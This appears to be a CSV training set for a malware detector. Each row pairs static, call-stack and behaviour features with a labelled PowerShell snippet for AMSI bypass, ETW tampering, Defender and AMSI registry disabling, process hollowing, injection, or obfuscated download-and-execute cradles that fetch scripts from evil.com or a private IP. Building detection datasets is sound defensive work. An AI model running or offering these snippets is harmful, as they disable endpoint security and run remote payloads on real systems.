code_length,line_count,avg_line_length,entropy,amsi_keyword_count,has_amsi_keyword,win32_api_count,has_virtualprotect,has_getprocaddress,has_loadlibrary,reflection_count,has_reflection,marshal_op_count,backtick_count,has_format_operator,char_cast_count,string_concat_count,plus_operator_density,has_base64,has_memory_patch_pattern,hex_byte_array,has_page_rwx,dllimport_count,has_add_type,has_registry_amsi,has_ps_downgrade,has_scriptblock_ast,has_hw_breakpoint,has_etw_tamper,has_download_cradle,has_clr_targeting,special_char_ratio,case_ratio,composite_risk,callstack_amsi_dll_present,callstack_clr_to_kernel,callstack_ntdll_direct,callstack_wow64_transition,callstack_syscall_direct,callstack_reflection_depth,proc_spawns_cmd,proc_parent_spoofing,proc_inject_remote,proc_hollow_indicators,proc_runs_from_temp,proc_unusual_parent,mem_page_rwx,mem_page_rx_after_rw,mem_alloc_exec,mem_write_then_exec,mem_unbacked_region,mem_patch_size_small,bseq_load_reflect_exec,bseq_obfuscate_then_exec,bseq_download_then_exec,bseq_patch_amsi_then_run,bseq_etw_disable_then_run,bseq_clr_tamper,bseq_multi_evasion,dynamic_risk_score,label,label_name,source_id,raw_code_snippet
144,1,144.0,4.848549106747395,2,1,0,0,0,0,5,1,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.2361111111111111,0.1956521739130435,16,1,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,20,1,AMSI_Bypass,MAL-001,"$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$b=$a.GetField('amsiInitFailed','NonPublic,Static');"
172,1,172.0,4.930471185467623,2,1,0,0,0,0,4,1,1,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.19186046511627908,0.20353982300884957,16,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,20,1,AMSI_Bypass,MAL-002,[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField(
205,1,205.0,5.021438655589561,2,1,0,0,0,0,4,1,1,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.22439024390243903,0.21374045801526717,16,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,20,1,AMSI_Bypass,MAL-003,"$r=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$r.GetField('amsiContext','NonPublic,Static');[Sy"
429,1,429.0,5.314225903863112,2,1,1,1,0,0,4,1,0,0,0,0,0,0.0,0,1,1,1,1,1,0,0,0,0,0,0,0,0.21212121212121213,0.1803921568627451,26,1,1,0,0,0,1,0,0,0,0,0,0,1,1,0,0,0,1,0,0,0,1,0,1,0,37,1,AMSI_Bypass,MAL-004,"Add-Type -MemberDefinition '[DllImport(""kernel32"")] public static extern bool VirtualProtect(IntPtr a,UIntPtr b,uint c,o"
256,1,256.0,5.129526104815901,0,0,1,1,0,0,0,0,1,3,0,0,0,0.0,0,1,0,0,1,1,0,0,0,0,0,0,0,0.1640625,0.1411764705882353,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,AMSI_Bypass,MAL-005,"Add-Type @'`nusing System;using System.Runtime.InteropServices;`npublic class Bypass{[DllImport(""kernel32"")]public stati"
271,1,271.0,5.202381977410564,2,1,1,1,0,0,0,0,0,0,0,0,0,0.0,0,1,1,1,0,0,0,0,0,0,0,0,0,0.1881918819188192,0.16167664670658682,16,1,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,1,0,0,0,1,0,0,0,24,1,AMSI_Bypass,MAL-006,"$bytes=[byte[]](0x31,0xC0,0xC3,0x90); $addr=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Get"
348,1,348.0,5.009772136177422,0,0,0,0,0,0,0,0,1,0,0,0,0,0.0,0,0,0,0,1,1,0,0,0,0,0,0,0,0.16954022988505746,0.20444444444444446,4,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,1,AMSI_Bypass,MAL-007,[Runtime.InteropServices.Marshal]::WriteByte([Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Add-Type 
237,1,237.0,5.183521196542752,0,0,0,0,0,0,3,1,1,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,1,0,0,0.1940928270042194,0.19205298013245034,12,0,0,1,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,13,1,AMSI_Bypass,MAL-008,"$etw = [System.Diagnostics.Eventing.EventProvider]; $f = $etw.GetField('m_etwCallback','NonPublic,Instance'); $f.SetValu"
258,1,258.0,5.009041214839347,0,0,0,0,0,0,2,1,1,0,0,0,0,0.0,0,0,0,0,1,1,0,0,0,0,1,0,0,0.14728682170542637,0.18128654970760233,12,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,13,1,AMSI_Bypass,MAL-009,"Add-Type -MemberDefinition '[DllImport(""ntdll"")] public static extern int EtwEventWrite(ulong r,IntPtr d,uint c,IntPtr e"
256,1,256.0,5.209095742153459,0,0,0,0,0,0,3,1,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,1,0,0.19921875,0.14705882352941177,11,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,11,1,AMSI_Bypass,MAL-010,"$scriptblock = [scriptblock]::Create('IEX (New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'); $f"
421,1,421.0,5.0522215322120845,0,0,0,0,0,0,3,1,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,0,0.23990498812351543,0.13454545454545455,11,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,7,1,AMSI_Bypass,MAL-011,$sb=[scriptblock]::Create('Get-Process'); $spoof=[System.Management.Automation.Language.ScriptBlockAst]::new([System.Man
433,1,433.0,5.219585694894112,0,0,2,0,0,0,3,1,0,3,0,0,0,0.0,0,0,0,0,2,1,0,0,0,1,0,0,0,0.15935334872979215,0.20727272727272728,19,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,1,AMSI_Bypass,MAL-012,"Add-Type @'`nusing System;using System.Runtime.InteropServices;`npublic class VEH{[DllImport(""kernel32"")]public static e"
295,1,295.0,5.253200290194368,0,0,2,0,0,0,0,0,1,0,0,0,0,0.0,0,0,1,1,1,1,0,0,0,1,0,0,0,0.14576271186440679,0.20994475138121546,16,0,0,1,0,0,0,0,0,0,1,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,25,1,AMSI_Bypass,MAL-013,"[Runtime.InteropServices.Marshal]::WriteByte((Get-ProcAddress ntdll.dll RtlAddVectoredExceptionHandler),0xC3); $ctx=[Int"
332,1,332.0,5.035896865124619,2,1,0,0,0,0,3,1,1,0,0,0,0,0.0030120481927710845,0,0,0,0,0,0,0,0,0,0,0,0,1,0.21385542168674698,0.17889908256880735,18,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,20,1,AMSI_Bypass,MAL-014,$clr=[System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory(); $asm=[System.Reflection.Assembly]::Load
276,1,276.0,5.087193069292853,2,1,0,0,0,0,3,1,1,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.20652173913043478,0.18888888888888888,14,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,1,0,26,1,AMSI_Bypass,MAL-015,$sma=[AppDomain]::CurrentDomain.GetAssemblies()|?{$_.FullName -like '*System.Management.Automation*'}; $t=$sma.GetType('
119,1,119.0,4.925632524457973,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,1,0,0,0,1,0,0.17647058823529413,0.12987012987012986,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,4,1,AMSI_Bypass,MAL-016,"powershell -version 2 -nop -exec bypass -c ""IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')"""
266,1,266.0,4.6819647346437385,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,0,0,0,0,0,0,1,0,0,0,0,0,0.018796992481203006,1.5957446808510638,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,AMSI_Bypass,MAL-017,powershell.exe -version 2 -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQ
114,1,114.0,5.164011949025513,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,1,0,0,0,0,0,0,0.15789473684210525,0.45098039215686275,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,AMSI_Bypass,MAL-018,Remove-Item -Path 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}' -Recurse -Force
203,1,203.0,5.00011540173746,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,1,0,0,0,0,0,0,0.12315270935960591,0.4188034188034188,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,AMSI_Bypass,MAL-019,Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' -Name 'DisableRealtimeM
173,1,173.0,5.376150867585626,1,1,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,1,0,0,0,0,0,0,0.15606936416184972,0.7164179104477612,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,AMSI_Bypass,MAL-020,reg add 'HKLM\SOFTWARE\Microsoft\AMSI' /v AmsiEnable /t REG_DWORD /d 0 /f; Remove-Item -Path 'HKLM:\SOFTWARE\Microsoft\A
284,1,284.0,3.493249608358378,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.3028169014084507,0.3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,AMSI_Bypass,MAL-021,"$c=(-join ([char[]](73,69,88,32,40,78,101,119,45,79,98,106,101,99,116,32,78,101,116,46,87,101,98,67,108,105,101,110,116,"
93,1,93.0,4.922411388217619,0,0,0,0,0,0,0,0,0,11,0,0,2,0.021505376344086023,0,0,0,0,0,0,0,0,0,0,0,0,0,0.34408602150537637,0.20833333333333334,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,AMSI_Bypass,MAL-022,I`E`X (Ne`w-O`bject N`e`t`.W`ebC`lient).Dow`nloadS`tring('htt'+'p://'+'evil.com/payload.ps1')
98,1,98.0,5.2043026044755,0,0,0,0,0,0,0,0,0,0,1,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,1,0,0.32653061224489793,0.3023255813953488,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,4,1,AMSI_Bypass,MAL-023,"{0}{1}{2}' -f 'IE','X ','(New-Object Net.WebClient).DownloadString(""http://evil.com/p.ps1"")' | IEX"
124,1,124.0,4.919252411813111,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,0,0,0,0,0,0,0,0,0,0,0,0,0.24193548387096775,0.3333333333333333,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,AMSI_Bypass,MAL-024,[ScriptBlock]::Create([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('SQBFAFYA...'))).Invo
214,1,214.0,4.888719615972458,0,0,1,0,0,0,0,0,0,0,0,0,0,0.0,0,0,1,1,0,0,0,0,0,0,0,0,0,0.205607476635514,0.19827586206896552,5,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,21,1,AMSI_Bypass,MAL-025,"$handle = OpenProcess(0x001F0FFF,$false,1234); WriteProcessMemory($handle,[IntPtr]0x400000,$shellcode,$shellcode.Length,"
386,1,386.0,4.758329261706758,0,0,1,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,3,1,0,0,0,0,0,0,0,0.12176165803108809,0.1484375,8,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,16,1,AMSI_Bypass,MAL-026,"Add-Type -MemberDefinition '[DllImport(""kernel32"")] public static extern IntPtr OpenProcess(uint a,bool b,int c); [DllIm"
361,1,361.0,5.00992226273214,0,0,1,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,3,1,0,0,0,1,0,0,0,0.13019390581717452,0.16115702479338842,13,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,12,1,AMSI_Bypass,MAL-027,"Add-Type -MemberDefinition '[DllImport(""ntdll"")] public static extern int NtUnmapViewOfSection(IntPtr p,IntPtr b); [DllI"
288,1,288.0,5.128291416950842,0,0,2,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,1,0,0,0,0.19791666666666666,0.1443850267379679,9,0,0,1,0,0,0,1,0,1,1,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,28,1,AMSI_Bypass,MAL-028,"$pi = Start-Process -FilePath svchost.exe -PassThru -Suspended; [ntdll]::NtUnmapViewOfSection($pi.Handle,$baseAddr); [ke"
544,1,544.0,5.106100446302153,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,2,1,0,0,0,0,0,0,0,0.14154411764705882,0.2537764350453172,4,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,1,AMSI_Bypass,MAL-029,"Add-Type -MemberDefinition '[DllImport(""kernel32"")] public static extern bool UpdateProcThreadAttribute(IntPtr a,uint f,"
85,1,85.0,5.129765571778782,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,1,0,0.21176470588235294,0.22727272727272727,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,4,1,AMSI_Bypass,MAL-030,IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/amsi_bypass.ps1')
93,1,93.0,4.869293424188795,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,1,0,0.15053763440860216,0.15384615384615385,0,0,0,0,0,0,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,4,1,AMSI_Bypass,MAL-031,Invoke-Expression (Invoke-WebRequest -Uri 'http://evil.com/payload' -UseBasicParsing).Content
134,1,134.0,5.217119978292108,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,1,0,0.23880597014925373,0.20512820512820512,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,4,1,AMSI_Bypass,MAL-032,"$wc=New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent','Mozilla/5.0'); IEX $wc.DownloadString('http://evil.co"
53,1,53.0,4.517751294423243,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,1,0,0.16981132075471697,0.08571428571428572,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,4,1,AMSI_Bypass,MAL-033,iwr -uri http://evil.com/p.ps1 -UseBasicParsing | iex
290,1,290.0,5.044331373628026,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,1,1,1,1,0,0,0,0,0,0,0,0.1793103448275862,0.15517241379310345,5,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,10,1,AMSI_Bypass,MAL-034,"Add-Type -MemberDefinition '[DllImport(""ntdll"")] public static extern int NtAllocateVirtualMemory(IntPtr p,ref IntPtr b,"
237,1,237.0,5.109721046884006,0,0,0,0,0,0,4,1,1,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.1940928270042194,0.17834394904458598,10,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,10,1,AMSI_Bypass,MAL-035,$ntdll=[System.Reflection.Assembly]::LoadFile('C:\Windows\System32\ntdll.dll'); $func=$ntdll.GetType('ntdll').GetMethod(
99,1,99.0,4.86656104500524,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,0,0,0,0,0,0,0,0,0,0,0,0,0.12121212121212122,0.3103448275862069,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,AMSI_Bypass,MAL-036,Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -nop -enc SQBFAFYA...'
174,1,174.0,5.034340474535383,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,1,0,0,0,1,0,0.21839080459770116,0.05217391304347826,2,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,4,1,AMSI_Bypass,MAL-037,"$wmi=[wmiclass]'\\.oot\cimv2:Win32_Process'; $wmi.Create('cmd.exe /c powershell -version 2 -exec bypass -c IEX (new-obj"
257,1,257.0,5.083116056054353,2,1,0,0,0,0,5,1,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.245136186770428,0.15853658536585366,16,1,0,0,0,0,3,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,1,0,25,1,AMSI_Bypass,MAL-038,$rs=[runspacefactory]::CreateRunspace(); $rs.Open(); $ps=[powershell]::Create(); $ps.Runspace=$rs; $ps.AddScript('[Ref].
478,1,478.0,5.176373949516745,2,1,0,0,0,0,1,1,0,3,0,0,0,0.0,0,0,1,0,1,1,0,0,0,0,0,0,0,0.16736401673640167,0.14641744548286603,13,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,19,1,AMSI_Bypass,MAL-039,"Add-Type -TypeDefinition @'`nusing System;using System.Runtime.InteropServices;`npublic class Amsi{[DllImport(""amsi.dll"""
194,1,194.0,4.871769428672944,2,1,0,0,0,0,5,1,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.17010309278350516,0.19696969696969696,16,1,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,20,1,AMSI_Bypass,MAL-040,$ExecutionContext.SessionState.LanguageMode = 'FullLanguage'; [Ref].Assembly.GetType('System.Management.Automation.AmsiU
277,1,277.0,5.073587810746691,1,1,0,0,0,0,3,1,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,1,0.21660649819494585,0.15254237288135594,13,1,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,11,1,AMSI_Bypass,MAL-041,$clr_asm = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.Location -like '*System.Management.Automation*
663,1,663.0,5.1978338503267585,2,1,1,0,1,0,0,0,0,0,0,0,0,0.0,0,0,1,1,3,1,0,0,0,0,0,0,0,0.18099547511312217,0.15233415233415235,17,1,0,1,0,0,0,0,0,0,0,0,0,1,1,0,0,0,1,0,0,0,1,0,0,0,29,1,AMSI_Bypass,MAL-042,"[byte[]]$patch = 0x31,0xC0,0xC3; $addr = (Add-Type -MemberDefinition '[DllImport(""kernel32"")] public static extern IntPt"
161,1,161.0,4.868941758200462,0,0,0,0,0,0,5,1,0,0,0,0,4,0.031055900621118012,0,0,0,0,0,0,0,0,0,0,0,0,0,0.30434782608695654,0.1956521739130435,10,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,7,1,AMSI_Bypass,MAL-043,"$a='Am'+'siU'+'tils'; $b='amsi'+'Init'+'Failed'; [Ref].Assembly.GetType('System.Management.Automation.'+$a).GetField($b,"
164,1,164.0,4.943902595844359,1,1,0,0,0,0,5,1,0,0,0,0,1,0.006097560975609756,0,0,0,0,0,0,0,0,0,0,0,0,0,0.25609756097560976,0.17647058823529413,13,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,16,1,AMSI_Bypass,MAL-044,"$key='amsiInitFailed'; $type=[Ref].Assembly.GetType(""System.Management.Automation.$('Amsi'+'Utils')""); $type.GetField($k"
120,1,120.0,5.067155962520953,0,0,0,0,0,0,0,0,0,0,0,0,2,0.03333333333333333,0,0,0,0,0,0,0,0,0,0,0,1,0,0.35,0.1746031746031746,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,4,1,AMSI_Bypass,MAL-045,"& ([scriptblock]::Create(('IE'+'X')+' '+('(New-Object Net.WebClient).DownloadString(""http://evil.com/bypass.ps1"")'+')'))"
279,1,279.0,5.7225522911097935,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,0,0,0,0,0,0,0,0,0,0,1,0,0.08602150537634409,0.7615384615384615,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,AMSI_Bypass,MAL-046,$encoded='W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHMnKS5HZXRGaWVsZCgnYW1zaUluaX
